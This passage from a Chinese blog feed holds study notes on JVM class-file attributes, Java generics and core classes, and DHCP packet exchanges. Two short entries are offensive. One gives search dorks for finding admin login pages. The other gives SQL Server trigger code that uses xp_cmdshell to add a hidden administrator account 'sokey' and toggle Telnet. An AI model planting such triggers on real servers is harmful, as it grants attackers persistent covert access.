目前jvm常见的预定义属性包括：下面详细说明下Code、LineNumberTable、LocalVariableTable属性。code属性Java程序方法体中的代码经过Javac编译器处理后，最终变成字节码指令存储在code属性内。Code属性表的结果如下：123456789101112struct Code &#123;u2 attribute_name_index;u4 attribute_length;u2 max_stack;u2 max_locals;u4 code_length;u1 code[code_length];u2 exception_table_length;exception_info exception_table;u2 attribute_count;attribute_info attributes;&#125; attribute_name_index是一项指向常量表的索引，常量值固定为“Code”，它代表了该属性的属性名称，attribute_length指示了属性值的长度，由于属性名称索引与属性长度一共是6个字节，所以属性值的长度固定为整个属性表的长度减去6个字节。max_stack代表了操作数栈(Operand Stacks)的最大深度。在方法执行的任意时刻，操作数栈都不会超过这个深度。虚拟机运行的时候需要根据这个值来分配栈帧(Frame)中的操作数栈深度。max_locals代表了局部变量表所需的存储空间。在这里，max_locals的单位是Slot，Slot是虚拟机为局部变量表分配内存所使用的最小单位。对于byte,char,float,int,shot,boolean,reference和returnAddress等长度不超过32位的数据类型，每个局部变量占1个Slot，而double与long这两种64位的数据类型而需要2个Slot来存放。 方法参数(包括实例方法中的隐藏参数“this”)，显示异常处理器的参数(Exception Handler Parameter,即try-catch语句中catch块所定义的异常)，方法体中定义的局部变量都需要使用局部表来存放 。另外， 并不是在方法中使用了多个局部变量，就把这些局部变量所占的Slot之和作为max_locals的值，原因是局部变量表中的Slot可以重用，当代码执行超出一个局部变量的作用域时，这个局部变量所在的Slot就可以被其他局部变量所使用，编译器会根据变量的作用域来分类Slot并分配给各个变量使用，然后计算出max_locals的大小 。LineNumberTable属性123456789LineNumberTable属性用于描述Java源代码行号与字节码行号(字节码偏移量)之间的对应关系。它并不是运行时必须的属性。如果选择不生成LineNumberTable属性表，对程序运行产生的最主要的影响就是在抛出异常时，堆栈中将不会显示出错的行号，并且在调试程序的时候无法按照源码来设置断点。```jsstruct LineNumberTable &#123;u2 attribute_name_index;u4 attribute_length;u2 line_number_table_length;line_number_info line_number_table;&#125; 其中，line_number_table是一个数量为line_number_table_length，类型为line_number_info的集合，line_number_info表包括了start_pc和line_number两个u2类型的数据项，前者是字节码行号，后者是Java源码行号。LocalVariableTable属性LocalVariableTable属性表用于描述栈帧中局部变量表中的变量与Java源码中定义的变量之间的关系。LocalVariableTable属性表结构如下：说完那么多概念，我们回到方法表字节码：0003 0001 0009 000a 0001 000b 0000 002f 0001 0001 00000005 2ab7 000c b100 0000 0200 0e00 0000 0600 0100 0000 03000f00 0000 0c00 0100 0000 0500 1000 1100 0000 0100 1200 0a我们从头开始说明这块字节码的意思：0x0003代表方法表中包含3个方法，接下来的0x0001 0009 000a依次代表第一个方法的访问属性public、名称索引对应、描述符索引()V。0x0001代表属性表中有一个属性，0x000b对应常量池中的字符串Code，代表该属性为Code类型，0x0000 002f代表下面的code属性表长度为47个字节。0x0001栈深，0x0001局部变量表大小，0x0000 0005代码长度，0x2ab7 000c b1代码区域，0x0000异常表，0x0002属性表个数，0x000e指向常量池字符串LineNumberTable，0x0000 0006属性长度6个字节，0x0001行号表长度为1，0x0000 0003代表字节码行号为0，对应的java源码行号为3。0x000f指向常量池字符串LocalVariableTable，属性长度0x0000 000c为十进制数12，0x0001局部变量表长度为1，程序计数器起始值为0x0000，索引长度对应的值为0x0005，局部变量名称为0x0010即常量this，描述符索引为0x0011，对应常量Lcom/test/doc/exp/TestClassCode，slot为0。]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java API研究(一)]]></title>
    <url>%2F2017%2F05%2F20%2Ffirst%2F</url>
    <content type="text"><![CDATA[RegistryRegistry接口，超接口是Remote顾名思义Remote 接口用于标识其方法可以从非本地虚拟机上调用的接口。任何远程对象都必须直接或间接实现此接口。只有在“远程接口”（扩展 java.rmi.Remote 的接口）中指定的这些方法才可远程使用。实现类可以实现任意数量的远程接口，并且可以扩展其他远程实现类。RMI 提供一些远程对象实现可以扩展的有用类，这些类便于远程对象创建。这些类是 java.rmi.server.UnicastRemoteObject 和 java.rmi.activation.Activatable。Registry 是简单远程对象注册表的一个远程接口，它提供存储和获取绑定了任意字符串名称的远程对象引用的方法。bind、unbind 和 rebind 方法用于改变注册表中的名称绑定，lookup 和 list 方法用于查询当前的名称绑定。 涉及的知识泛型即“参数化类型”。一提到参数，最熟悉的就是定义方法时有形参，然后调用此方法时传递实参。那么参数化类型怎么理解呢？顾名思义，就是将类型由原来的具体的类型参数化，类似于方法中的变量参数，此时类型也定义成参数形式（可以称之为类型形参），然后在使用/调用时传入具体的类型（类型实参）。123456789101112131415161718192021public class GenericTest &#123; public static void main(String[] args) &#123; /* List list = new ArrayList(); list.add("qqyumidi"); list.add("corn"); list.add(100); */ List&lt;String&gt; list = new ArrayList&lt;String&gt;(); list.add("qqyumidi"); list.add("corn"); //list.add(100); // 1 提示编译错误 for (int i = 0; i &lt; list.size(); i++) &#123; String name = list.get(i); // 2 System.out.println("name:" + name); &#125; &#125; &#125; 采用泛型写法后，在//1处想加入一个Integer类型的对象时会出现编译错误，通过List，直接限定了list集合中只能含有String类型的元素，从而在//2处无须进行强制类型转换，因为此时，集合能够记住元素的类型信息，编译器已经能够确认它是String类型了。 结合上面的泛型定义，我们知道在List中，String是类型实参，也就是说，相应的List接口中肯定含有类型形参。且get()方法的返回结果也直接是此形参类型（也就是对应的传入的类型实参）。下面就来看看List接口的的具体定义：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152public interface List&lt;E&gt; extends Collection&lt;E&gt; &#123; int size(); boolean isEmpty(); boolean contains(Object o); Iterator&lt;E&gt; iterator(); Object[] toArray(); &lt;T&gt; T[] toArray(T[] a); boolean add(E e); boolean remove(Object o); boolean containsAll(Collection&lt;?&gt; c); boolean addAll(Collection&lt;? extends E&gt; c); boolean addAll(int index, Collection&lt;? extends E&gt; c); boolean removeAll(Collection&lt;?&gt; c); boolean retainAll(Collection&lt;?&gt; c); void clear(); boolean equals(Object o); int hashCode(); E get(int index); E set(int index, E element); void add(int index, E element); E remove(int index); int indexOf(Object o); int lastIndexOf(Object o); ListIterator&lt;E&gt; listIterator(); ListIterator&lt;E&gt; listIterator(int index); List&lt;E&gt; subList(int fromIndex, int toIndex); &#125; 我们可以看到，在List接口中采用泛型化定义之后，中的E表示类型形参，可以接收具体的类型实参，并且此接口定义中，凡是出现E的地方均表示相同的接受自外部的类型实参。自定义泛型接口、泛型类和泛型方法123456789101112131415161718192021222324252627public class GenericTest &#123; public static void main(String[] args) &#123; Box&lt;String&gt; name = new Box&lt;String&gt;("corn"); System.out.println("name:" + name.getData()); &#125; &#125; class Box&lt;T&gt; &#123; private T data; public Box() &#123; &#125; public Box(T data) &#123; this.data = data; &#125; public T getData() &#123; return data; &#125; &#125; 类型通配符接着上面的结论，我们知道，Box和Box实际上都是Box类型，现在需要继续探讨一个问题，那么在逻辑上，类似于Box和Box是否可以看成具有父子关系的泛型类型呢？12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364public class GenericTest &#123; public static void main(String[] args) &#123; Box&lt;Number&gt; name = new Box&lt;Number&gt;(99); Box&lt;Integer&gt; age = new Box&lt;Integer&gt;(712); getData(name); //The method getData(Box&lt;Number&gt;) in the type GenericTest is //not applicable for the arguments (Box&lt;Integer&gt;) getData(age); // 1 &#125; public static void getData(Box&lt;Number&gt; data)&#123; System.out.println("data :" + data.getData()); &#125; &#125; 我们发现，在代码//1处出现了错误提示信息：The method getData(Box&lt;Number&gt;) in the t ype GenericTest is not applicable for the arguments (Box&lt;Integer&gt;)。显然，通过提示信息，我们知道Box&lt;Number&gt;在逻辑上不能视为Box&lt;Integer&gt;的父类。那么，原因何在呢？[java] view plain copypublic class GenericTest &#123; public static void main(String[] args) &#123; Box&lt;Integer&gt; a = new Box&lt;Integer&gt;(712); Box&lt;Number&gt; b = a; // 1 Box&lt;Float&gt; f = new Box&lt;Float&gt;(3.14f); b.setData(f); // 2 &#125; public static void getData(Box&lt;Number&gt; data) &#123; System.out.println("data :" + data.getData()); &#125; &#125; class Box&lt;T&gt; &#123; private T data; public Box() &#123; &#125; public Box(T data) &#123; setData(data); &#125; public T getData() &#123; return data; &#125; public void setData(T data) &#123; this.data = data; &#125; &#125; 这个例子中，显然//1和//2处肯定会出现错误提示的。在此我们可以使用反证法来进行说明。 假设Box在逻辑上可以视为Box的父类，那么//1和//2处将不会有错误提示了，那么问题就出来了，通过getData()方法取出数据时到底是什么类型呢？Integer? Float? 还是Number？且由于在编程过程中的顺序不可控性，导致在必要的时候必须要进行类型判断，且进行强制类型转换。显然，这与泛型的理念矛盾，因此，在逻辑上Box不能视为Box的父类。 好，那我们回过头来继续看“类型通配符”中的第一个例子，我们知道其具体的错误提示的深层次原因了。那么如何解决呢？总部能再定义一个新的函数吧。这和Java中的多态理念显然是违背的，因此，我们需要一个在逻辑上可以用来表示同时是Box和Box的父类的一个引用类型，由此，类型通配符应运而生。 类型通配符一般是使用 ? 代替具体的类型实参。注意了，此处是类型实参，而不是类型形参！且Box&lt;?&gt;在逻辑上是Box、Box…等所有Box&lt;具体类型实参&gt;的父类。由此，我们依然可以定义泛型方法，来完成此类需求。123456789101112131415161718public class GenericTest &#123; public static void main(String[] args) &#123; Box&lt;String&gt; name = new Box&lt;String&gt;("corn"); Box&lt;Integer&gt; age = new Box&lt;Integer&gt;(712); Box&lt;Number&gt; number = new Box&lt;Number&gt;(314); getData(name); getData(age); getData(number); &#125; public static void getData(Box&lt;?&gt; data) &#123; System.out.println("data :" + data.getData()); &#125; &#125; 有时候，我们还可能听到类型通配符上限和类型通配符下限。具体有是怎么样的呢？ 在上面的例子中，如果需要定义一个功能类似于getData()的方法，但对类型实参又有进一步的限制：只能是Number类及其子类。此时，需要用到类型通配符上限。1234567891011121314151617181920212223242526public class GenericTest &#123; public static void main(String[] args) &#123; Box&lt;String&gt; name = new Box&lt;String&gt;("corn"); Box&lt;Integer&gt; age = new Box&lt;Integer&gt;(712); Box&lt;Number&gt; number = new Box&lt;Number&gt;(314); getData(name); getData(age); getData(number); //getUpperNumberData(name); // 1 getUpperNumberData(age); // 2 getUpperNumberData(number); // 3 &#125; public static void getData(Box&lt;?&gt; data) &#123; System.out.println("data :" + data.getData()); &#125; public static void getUpperNumberData(Box&lt;? extends Number&gt; data)&#123; System.out.println("data :" + data.getData()); &#125; &#125; 此时，显然，在代码//1处调用将出现错误提示，而//2 //3处调用正常。 类型通配符上限通过形如Box&lt;? extends Number&gt;形式定义，相对应的，类型通配符下限为Box&lt;? super Number&gt;形式，其含义与类型通配符上限正好相反，在此不作过多阐述了。 Registry使用java.lang.Class类介绍Class 类的实例表示正在运行的 Java 应用程序中的类和接口。枚举是一种类，注释是一种接口。每个数组属于被映射为 Class 对象的一个类，所有具有相同元素类型和维数的数组都共享该 Class 对象。基本的 Java 类型（boolean、byte、char、short、int、long、float 和 double）和关键字 void 也表示为 Class 对象。(这是官方文档的说法,为了保证这些原话就放在这里，就我的理解，Class类是不用new的对象，是由它由JVM自动调用。调用做什么呢？做的就是new出来对象，也就是说他在内存中是为了创建一个新的对象而存在的。当然既然在内存中，那么Java这些开发人员肯定你会给我们调用它们的途径或者是找到它们的栈地址，方便我们使用，具体的找到就是类名.class,实例名.getClass(),Class.forName(包名+类名))Class 没有公共构造方法。Class 对象是在加载类时由 Java 虚拟机以及通过调用类加载器中的 defineClass 方法自动构造的。 java.util.Properties类Properties 类表示了一个持久的属性集。Properties 可保存在流中或从流中加载。属性列表中每个键及其对应值都是一个字符串。一个属性列表可包含另一个属性列表作为它的“默认值”；如果未能在原有的属性列表中搜索到属性键，则搜索第二个属性列表。作用：存储键值对数据的类。 java.lang.ClassLoader类介绍类加载器是负责加载类的对象。ClassLoader 类是一个抽象类。如果给定类的二进制名称，那么类加载器会试图查找或生成构成类定义的数据。一般策略是将名称转换为某个文件名，然后从文件系统读取该名称的“类文件”。主要作用:实现加载类，网络类加载器，JNI类加载器。 java.lang.System类介绍System 类包含一些有用的类字段和方法。它不能被实例化。在 System 类提供的设施中，有标准输入、标准输出和错误输出流；对外部定义的属性和环境变量的访问；加载文件和库的方法；还有快速复制数组的一部分的实用方法。由于System类被私有化，所以无法实例化，里面基本都是静态方法。 final解释final类不能被继承，因此final类的成员方法没有机会被覆盖，默认都是final的。在设计类时候，如果这个类不需要有子类，类的实现细节不允许改变，并且确信这个类不会载被扩展，那么就设计为final类。如果一个类不允许其子类覆盖某个方法，则可以把这个方法声明为final方法。用final修饰的成员变量表示常量，值一旦给定就无法改变！final修饰的变量有三种：静态变量、实例变量和局部变量，分别表示三种类型的常量。当函数参数为final类型时，你可以读取使用该参数，但是无法改变该参数的值。 static解释 static表示“全局”或者“静态”的意思，用来修饰成员变量和成员方法，也可以形成静态static代码块，但是Java语言中没有全局变量的概念。被static修饰的成员变量和成员方法独立于该类的任何对象。也就是说，它不依赖类特定的实例，被类的所有实例共享。只要这个类被加载，Java虚拟机就能根据类名在运行时数据区的方法区内定找到他们。因此，static对象可以在它的任何对象创建之前访问，无需引用任何对象。用public修饰的static成员变量和成员方法本质是全局变量和全局方法，当声明它类的对象市，不生成static变量的副本，而是类的所有实例共享同一个static变量。 static变量前可以有private修饰，表示这个变量可以在类的静态代码块中，或者类的其他静态成员方法中使用（当然也可以在非静态成员方法中使用–废话），但是不能在其他类中通过类名来直接引用，这一点很重要。private是访问权限限定，static表示不要实例化就可以使用用static修饰的代码块表示静态代码块，当Java虚拟机（JVM）加载类时，就会执行该代码块按照是否静态的对类成员变量进行分类可分两种：一种是被static修饰的变量，叫静态变量或类变量；另一种是没有被static修饰的变量，叫实例变量。两者的区别是： 对于静态变量在内存中只有一个拷贝（节省内存），JVM只为静态分配一次内存，在加载类的过程中完成静态变量的内存分配，可用类名直接访问（方便），当然也可以通过对象来访问（但是这是不推荐的）。 对于实例变量，没创建一个实例，就会为实例变量分配一次内存，实例变量可以在内存中有多个拷贝，互不影响（灵活）。静态方法可以直接通过类名调用，任何的实例也都可以调用，因此静态方法中不能用this和super关键字，不能直接访问所属类的实例变量和实例方法(就是不带static的成员变量和成员成员方法)，只能访问所属类的静态成员变量和成员方法。static代码块也叫静态代码块，是在类中独立于类成员的static语句块，可以有多个，位置可以随便放，它不在任何的方法体内，JVM加载类时会执行这些静态的代码块，如果static代码块有多个，JVM将按照它们在类中出现的先后顺序依次执行它们，每个代码块只会被执行一次。final和static一块使用对于变量，表示一旦给值就不可修改，并且通过类名可以访问。对于方法，表示不可覆盖，并且可以通过类名直接访问。]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搜索引擎探讨]]></title>
    <url>%2F2017%2F05%2F20%2Fsecond%2F</url>
    <content type="text"><![CDATA[关于如何搜索到管理员登录界面在搜索框中输入intitle:管理员登录allintitle:管理员登录allintitle:”管理员登录” 关于搜索引擎的使用技巧inurl:”www.lzhword.cn&quot;allinurl:”www.lzhword.cn&quot;site:”www.lzhword.cn&quot;inurl:asp?id=2 缓存获取cache:”www.lzhword.cn&quot;]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[触发器提权]]></title>
    <url>%2F2017%2F05%2F19%2Fthird%2F</url>
    <content type="text"><![CDATA[创建一个表create table backdoor(LASTNAME varchar(10),FIRSTNAME varchar(10)) 创建一个触发器，当有任何字符输入到这个表当中在系统中建立超级用户create TRIGGER TR_HACKER1 ON backdoorAFTER INSERTASBEGIN EXECUTE SP_ADDEXTENDEDPROC ‘MASTER.DBO.XP_CMDSHELL’,’XPLOG70.DLL’–’XPSQL70.DLL’ EXECUTE MASTER.DBO.XP_CMDSHELL ‘net user sokey 123456 /add’ EXECUTE MASTER.DBO.XP_CMDSHELL ‘net localgroup administrators sokey /add’ end 创建一个触发器，当输入字符串在字段中等于open的时候开启TELNET,为CLOSE时候关闭TELNET.当输入字符串在字段中等于open的时候开启TELNET,为CLOSE时候关闭TELNET.CREATE TRIGGER TR_HACKER2 ON backdoorAFTER INSERTASBEGIN DECLARE @P VARCHAR(50) SELECT @P=(SELECT LASTNAME FROM INSERTED) EXECUTE SP_ADDEXTENDEDPROC ‘MASTER.DBO.XP_CMDSHELL’,’XPLOG70.DLL’–’XPSQL70.DLL’ IF(@P LIKE ‘%OPEN%’) EXECUTE MASTER.DBO.XP_CMDSHELL ‘NET START TELNET’ ELSE IF(@P LIKE ‘%CLOSE%’) EXECUTE MASTER.DBO.XP_CMDSHELL ‘NET STOP TELNET’ END 插入字符我匹配的字符是LASTNAME等于open，别的字符都不行的INSERT INTO backdoor(LASTNAME,FIRSTNAME) VALUES(‘111’,’open’) 动态链接库后门制作动态链接库移入到数据库的bin目录执行use masterEXECUTE/EXEC SP_ADDEXTENDEDPROC ‘模块名’]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows搭建DHCP服务器]]></title>
    <url>%2F2017%2F05%2F19%2Ffirst%2F</url>
    <content type="text"><![CDATA[必备知识ip地址与二进制的关系:00000000.00000000.00000000.000000000.0.0.0第一个是二进制0，第二个是根据二进制划分为四个十进制。又是按一个一个字节来划分的。ABCDE类地址:A地址由1字节的网络地址和3字节的主机地址组成，网络地址的最高位必须是”0”,地址范围是1.0.0.0到126.0.0.0。126个网络，每个网络能容纳1千多万个主机。127.0.0.1是电脑的内测地址。B类地址由两字节的网络地址和两字节的主机地址组成，网络地址的最高位必须是”10”,地址范围是128.0.0.0到191.255.255.255。16320个网络，每个网络能容纳6万多个主机。C类地址由三字节的网络地址和一字节的主机地址组成，网络地址的最高位必须是”110”,范围从192.0.0.0到223.255.255.255.C类网络可达209万余个，每个网络能容纳254个主机。D类地址多用于广播，D类IP地址第一个字节以”1110”开始，它并不指向特定网络，目前这一类地址被用在多点广播中。多点广播地址用来一次寻址一组计算机，它表示共享同一协议的一组计算机。E类IP地址，以”1111”开始，为将来使用保留。全零（“0．0．0．0”）地址对应于当前主机。全“1”的IP地址（“255．255．255．255”）是当前子网的广播地址。这里的全1是指11111111.11111111.11111111.11111111在IP地址3种主要类型里，各保留了3个区域作为私有地址，其地址范围如下：A类地址：10.0.0.0～10.255.255.255B类地址：172.16.0.0～172.31.255.255C类地址：192.168.0.0～192.168.255.255A类地址的第一组数字为1～126。注意，数字0和 127不作为A类地址，数字127保留给内部回送函数，而数字0则表示该地址是本地宿主机，不能传送。A类地址的子网掩码为255.0.0.0B类地址的子网掩码为255.255.0.0C类地址的子网掩码为255.255.255.0子网掩码目的就是划分出网络地址和主机地址，关于子网掩码的计算，可以http://www.lzhword.cn/2017/01/17/20170117first/去看。 DHCP个人理解其实在网络中DHCP可以是不必要的，通过静态IP地址即可实现，但是在大型网络中，有上万台主机，你不可能一个个去设置吧。所以这就出现了DHCP，这里就将C类地址的DHCP吧。DHCP客户端是以UDP 68号端口进行数据传输的，而DHCP服务器是以UDP 67号端口进行数据传输的。DHCP是利用传输层的UDP 68号端口发送（封装的目的端口为UDP 68号端口），经过网络层IP协议封装后，源IP地址为0.0.0.0（因为此时还没有分配IP地址），目的IP地址为255.255.255.255（有限广播IP地址）。这个有限广播地址就是代表任意一个IPv4子网的广播地址，当然是发送报文的主机所在的子网和DHCP服务器所在子网的广播地址。 至于IP报头中的源地址，由于当前DHCP客户端主机并未分配具体的IP地址，所以只能用具有任意代表功能的0.0.0.0地址来表示了。客户端发送的报文:12345678910111213141516171819202122232425262728293031323334353637383940414243IP:ID = 0x0; Proto = UDP;Len: 328IP:Version = 4 (0x4)IP:Header Length = 20 (0x14)IP:Service Type = 0 (0x0)IP:Precedence = RoutineIP:...0.... = Normal DelayIP:....0... = NormalThroughputIP:.....0.. = NormalReliabilityIP:Total Length = 328(0x148)IP:Identification = 0 (0x0)IP:Flags Summary = 0 (0x0)IP:.......0 = Last fragmentin datagramIP:......0. = May fragmentdatagram ifnecessaryIP:Fragment Offset = 0 (0x0)bytesIP:Time to Live = 128 (0x80)IP:Protocol = UDP - User Datagram !---使用UDP传输层协议IP:Checksum = 0x39A6IP:Source Address = 0.0.0.0 !---源IP地址为0.0.0.0IP:Destination Address = 255.255.255.255 !----目的IP地址为255.255.255.255IP:Data:Number of data bytesremaining =308 (0x0134)DHCP:Discover (xid=21274A1D)DHCP:OpCode (op) = 1 (0x1)DHCP:HardwareType (htype) = 1 (0x1) 10Mb EthernetDHCP:Hardware Address Length(hlen) = 6(0x6)DHCP:Hops (hops) = 0 (0x0)DHCP:Transaction ID (xid) = 556223005 (0x21274A1D)DHCP:Seconds (secs) = 0 (0x0)DHCP:Flags (flags) = 1 (0x1) !---标志位置1，代表以广播方式发送DHCP:1............... = BroadcastDHCP:Client IP Address (ciaddr) =0.0.0.0DHCP:Your IP Address(yiaddr) =0.0.0.0DHCP:Server IP Address (siaddr) =0.0.0.0DHCP:Relay IP Address (giaddr)=0.0.0.0DHCP:Client Ethernet Address (chaddr) =08002B2ED85EDHCP:Server Host Name (sname) = &lt;Blank&gt;DHCP:Boot File Name (file) = &lt;Blank&gt;DHCP:Magic Cookie = [OK]DHCP:OptionField (options)DHCP:DHCP MessageType = DHCP Discover !---DHCP报文类型为DHCP DiscoverDHCP:Client-identifier =(Type:1) 08 00 2b 2e d8 5eDHCP:HostName = JUMBO-WS !---DHCP服务器主机名DHCP:Parameter Request List= (Length:7)01 0f 03 2c 2e 2f 06DHCP:End of this optionfield 提供阶段：即DHCP服务器向DHCP客户端提供预分配IP地址的阶段。网络中的所有DHCP服务器接收到客户端的DHCP DISCOVER报文后，都会根据自己地址池中IP地址分配的优先次序选出一个IP地址，然后与其它参数一起通过传输层的UDP 67号端口，在DHCP OFFER报文中以广播方式发送给客户端（目的端口是DHCP客户端的UDP 68号端口）。客户端通过封装在帧中的目的MAC地址（也就在DHCP DISCOVER报文中的CHADDR字段值）的比对来确定是否接收该帧。但这样一来，理论上DHCP客户端可能会收到多个DHCP OFFER报文（当网络中存在多个DHCP服务器时），但DHCP客户端只接受第一个到来的DHCP OFFER报文。服务器的报文123456789101112131415161718192021222324252627282930313233343536373839404142434445464748IP:ID = 0x3C30; Proto = UDP;Len: 328IP:Version = 4 (0x4)IP:Header Length = 20 (0x14)IP:Service Type = 0 (0x0)IP:Precedence = RoutineIP:...0.... = Normal DelayIP:....0... = NormalThroughputIP:.....0.. = NormalReliabilityIP:Total Length = 328(0x148)IP:Identification = 15408(0x3C30)IP:Flags Summary = 0 (0x0)IP:.......0 = Last fragmentin datagramIP:......0. = May fragmentdatagram ifnecessaryIP:Fragment Offset = 0 (0x0)bytesIP:Time to Live = 128 (0x80)IP:Protocol = UDP - User DatagramIP:Checksum = 0x2FA8IP:Source Address = 157.54.48.151IP:Destination Address = 255.255.255.255IP:Data:Number of data bytesremaining =308 (0x0134)DHCP:Offer (xid=21274A1D)DHCP:OpCode (op) = 2 (0x2)DHCP:HardwareType (htype) = 1 (0x1) 10Mb EthernetDHCP:Hardware Address Length(hlen) = 6(0x6)DHCP:Hops (hops) = 0 (0x0)DHCP:Transaction ID (xid) = 556223005 (0x21274A1D)DHCP:Seconds (secs) = 0 (0x0)DHCP:Flags (flags) = 1 (0x1)DHCP:1............... = BroadcastDHCP:Client IP Address (ciaddr) =0.0.0.0DHCP:Your IP Address(yiaddr) =157.54.50.5DHCP:Server IP Address (siaddr) =0.0.0.0DHCP:Relay IP Address (giaddr)=0.0.0.0DHCP:Client Ethernet Address(chaddr) =08002B2ED85EDHCP:Server Host Name (sname) = &lt;Blank&gt;DHCP:Boot File Name (file) = &lt;Blank&gt;DHCP:Magic Cookie = [OK]DHCP:OptionField (options)DHCP:DHCP MessageType = DHCPOffer !---DHCP报文类型为DHCP OfferDHCP:SubnetMask =255.255.240.0 !---所分配IP地址的子网掩码为255.255.240.0DHCP:Renewal Time Value (T1) = 8Days, 0:00:00 !---想要继续租约原来分配的IP地址，则提出续约申请的期限为8天DHCP:Rebinding Time Value (T2) = 14Days, 0:00:00 !---如果上次申请续约失败，再次申请绑定原来分配到的IP地址的期限为14天DHCP:IP Address Lease Time =16Days, 0:00:00 !---租约期限为16天，也就是DHCP客户端可使用此IP地址的最长时间为16天DHCP:ServerIdentifier =157.54.48.151 !---DHCP服务器的IP地址为157.54.48.151DHCP:Router =157.54.48.1 !---默认网关IP地址为157.54.48.1DHCP:NetBIOS Name Service =157.54.16.154 !---DNS服务器IP地址为157.54.16.154DHCP:NetBIOS Node Type =(Length: 1) 04DHCP:End of this optionfield 选择阶段即DHCP客户端选择IP地址的阶段。如果有多台DHCP服务器向该客户端发来DHCP OFFER报文，客户端只接受第一个收到的DHCP OFFER报文，然后以广播方式发送DHCP REQUEST报文。在该报文的“RequestedAddress”选项中包含DHCP服务器在DHCP OFFER报文中预分配的IP地址，对应的DHCP服务器IP地址等。这样也就相当于同时告诉得其他DHCP服务器，它们可以释放已提供的地址，并将这些地址返回到可用地址池中。报文:12345678910111213141516171819202122232425262728293031323334353637383940414243444546IP:ID = 0x100; Proto = UDP;Len: 328IP:Version = 4 (0x4)IP:Header Length = 20 (0x14)IP:Service Type = 0 (0x0)IP:Precedence = RoutineIP:...0.... = Normal DelayIP:....0... = NormalThroughputIP:.....0.. = NormalReliabilityIP:Total Length = 328(0x148)IP:Identification = 256(0x100)IP:Flags Summary = 0 (0x0)IP:.......0 = Last fragmentin datagramIP:......0. = May fragmentdatagram ifnecessaryIP:Fragment Offset = 0 (0x0)bytesIP:Time to Live = 128 (0x80)IP:Protocol = UDP - UserDatagramIP:Checksum = 0x38A6IP:Source Address = 0.0.0.0IP:Destination Address = 255.255.255.255IP:Data:Number of data bytesremaining =308 (0x0134) DHCP:Request (xid=21274A1D)DHCP:OpCode (op) = 1 (0x1)DHCP:HardwareType (htype) = 1 (0x1) 10Mb EthernetDHCP:Hardware Address Length(hlen) = 6(0x6)DHCP:Hops (hops) = 0 (0x0)DHCP:Transaction ID (xid) = 556223005 (0x21274A1D)DHCP:Seconds (secs) = 0 (0x0)DHCP:Flags (flags) = 1 (0x1)DHCP:1............... = BroadcastDHCP:Client IP Address (ciaddr) =0.0.0.0DHCP:Your IP Address(yiaddr) =0.0.0.0DHCP:Server IP Address (siaddr) =0.0.0.0DHCP:Relay IP Address (giaddr)=0.0.0.0DHCP:Client Ethernet Address(chaddr) =08002B2ED85EDHCP:Server Host Name (sname) = &lt;Blank&gt;DHCP:Boot File Name (file) = &lt;Blank&gt;DHCP:Magic Cookie = [OK]DHCP:OptionField (options)DHCP:DHCP MessageType = DHCP RequestDHCP:Client-identifier = (Type:1) 08 00 2b 2e d8 5eDHCP:RequestedAddress =157.54.50.5DHCP:ServerIdentifier =157.54.48.151DHCP:HostName =JUMBO-WSDHCP:Parameter Request List= (Length:7)01 0f 03 2c 2e 2f 06DHCP:End of this optionfield 确认阶段：即DHCP服务器确认分配级DHCP客户端IP地址的阶段。某个DHCP服务器在收到DHCP客户端发来的DHCP REQUEST报文后，只有DHCP客户端选择的服务器会进行如下操作：如果确认将地址分配给该客户端，则以广播方式返回DHCP ACK报文；否则返回DHCP NAK报文，表明地址不能分配给该客户端。 在DHCP 服务器发送的DHCP ACK报文的IP协议头部，Source Address是 DHCP 服务器IP地址，DestinationAddress仍然是广播地址255.255.255.255。在DHCP ACK报文中的Yiaddr字段包含要分配给客户端的IP地址，而Chaddr和DHCP:ClientIdentifier字段是发出请求的客户端中网卡的MAC地址。同时在选项部分也会在DHCP OFFER报文中把所分配的IP地址的子网掩码、默认网关、DNS服务器、租约期、续约时间等信息加上。报文12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849IP:ID = 0x3D30; Proto = UDP;Len: 328IP:Version = 4 (0x4)IP:Header Length = 20 (0x14)IP:Service Type = 0 (0x0)IP:Precedence = RoutineIP:...0.... = Normal DelayIP:....0... = NormalThroughputIP:.....0.. = NormalReliabilityIP:Total Length = 328(0x148)IP:Identification = 15664(0x3D30)IP:Flags Summary = 0 (0x0)IP:.......0 = Last fragmentin datagramIP:......0. = May fragmentdatagram ifnecessaryIP:Fragment Offset = 0 (0x0)bytesIP:Time to Live = 128 (0x80)IP:Protocol = UDP - UserDatagramIP:Checksum = 0x2EA8IP:Source Address = 157.54.48.151IP:Destination Address = 255.255.255.255IP:Data:Number of data bytesremaining =308 (0x0134) DHCP:ACK (xid=21274A1D)DHCP:OpCode (op) = 2 (0x2)DHCP:HardwareType (htype) = 1 (0x1) 10Mb EthernetDHCP:Hardware Address Length(hlen) = 6(0x6)DHCP:Hops (hops) = 0 (0x0)DHCP:Transaction ID (xid) = 556223005 (0x21274A1D)DHCP:Seconds (secs) = 0 (0x0)DHCP:Flags (flags) = 1 (0x1)DHCP:1............... =BroadcastDHCP:Client IP Address (ciaddr) =0.0.0.0DHCP:Your IP Address(yiaddr) =157.54.50.5DHCP:Server IP Address (siaddr) =0.0.0.0DHCP:Relay IP Address (giaddr)=0.0.0.0DHCP:Client Ethernet Address(chaddr) =08002B2ED85EDHCP:Server Host Name (sname) = &lt;Blank&gt;DHCP:Boot File Name (file) = &lt;Blank&gt;DHCP:Magic Cookie = [OK]DHCP:OptionField (options)DHCP:DHCP MessageType = DHCP ACKDHCP:Renewal Time Value (T1)= 8Days, 0:00:00DHCP:Rebinding Time Value(T2) = 14Days, 0:00:00DHCP:IP Address LeaseTime = 16Days, 0:00:00DHCP:ServerIdentifier =157.54.48.151DHCP:SubnetMask =255.255.240.0DHCP:Router =157.54.48.1DHCP:NetBIOS Name Service =157.54.16.154DHCP:NetBIOS NodeType = (Length: 1) 04DHCP:End of this optionfield 